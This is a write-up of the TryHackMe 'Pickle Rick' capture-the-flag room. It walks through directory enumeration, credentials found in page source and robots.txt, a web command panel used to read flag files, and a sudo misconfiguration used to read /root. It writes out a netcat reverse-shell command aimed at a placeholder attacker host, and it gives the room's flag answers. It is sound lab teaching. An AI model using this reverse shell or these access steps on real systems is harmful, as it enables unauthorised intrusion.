# Pickle Rick

{% embed url="https://tryhackme.com/room/picklerick" %}

Upon reading the source code in `http://10.10.253.172/`, I found the username `R1ckRul3s` within the comments.

...

```bash
gobuster dir -u ... -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
...
/assets
/robots.txt
/.htaccess
/.htpasswd
...
```

...

From `/robots.txt`:

`Wubbalubbadubdub`

...

```bash
$ ffuf -u http://<target>/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
/login.php
/portal.php
...
```

...

```bash
$ ffuf -h -u http://<target>/FUZZ -w .../Apache_common.txt
/login.php
/portal.php
... 
```

I visited the path `/login.php` , and was presented with a login page. I utilized the information we have gathered earlier to discover the username and password combination of `R1ckRul3s` and `Wubbalubbadubdub` respectively.

**Enumerating the webpage**

&#x20;`/portal.php`:

The following comment was found in the source code:

`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue, or perhaps a directory path value, name of a file, or simply something just to throw us off?

The main interface presented an input form that accepts commands for a Linux environment. This form will be used to enumerate the Linux system and find the ingredients.

### First ingredient

```bash
$ cat Sup3rS3cretPickl3Ingred.txt # does not work
$ more Sup3rS3cretPickl3Ingred.txt # does not work
$ less Sup3rS3cretPickl3Ingred.txt # WORKS!
mr. meeseek hair
```

### Second ingredient

```bash
$ ls /home
rick ubuntu

$ ls /home/rick
second ingredients

$ less '/home/rick/second ingredients' # 'more' and 'cat' disable
1 jerry tear
```

### Third ingredient

I was having difficulty finding the third ingredient from the file system, as most of my attempts at enumerating the directories returned an empty response. Thus, I decided to further enumerate the webpage.

Upon visiting `/denied.php` ,

We are presented with a message: "Only the REAL rick can view this page." This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?

**SQL Injection attempt**

I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.

```sql
...
```

The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.

I decided to focus my efforts back on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.

**Attempts to initiate a reverse shell**

```bash
$ perl ...
$ ... # bash
$ ... # python
$ nc <attacker> [port] -e /bin/sh # netcat
```

\
**Attempt to add a new SSH authorized key**&#x20;

```bash
$ ...
```

As mentioned before, access to the third ingredient most likely requires a privileged account. Thus, I attempted to escalate my privileges.

**Linux privilege escalation enumeration**

```bash
$ id
... # no dangerous groups such adm

$ find ..
# no dangerous file privileges

$ sudo -l

Matching Defaults entries for www-data on ip-10-10-49-150:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-49-150:
    (ALL) NOPASSWD: ALL # root privileges without password!!
    
```

**Attempts at abusing my `sudo` privileges to view system logs**

```bash
$ sudo less /var/log/syslog
...

===

```

**Finding the last and final ingredient**

Well, turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;

```bash
$ sudo ls -la /root
...
3rd.txt
...

$ sudo less /root/3rd.txt
fleeb juice
```
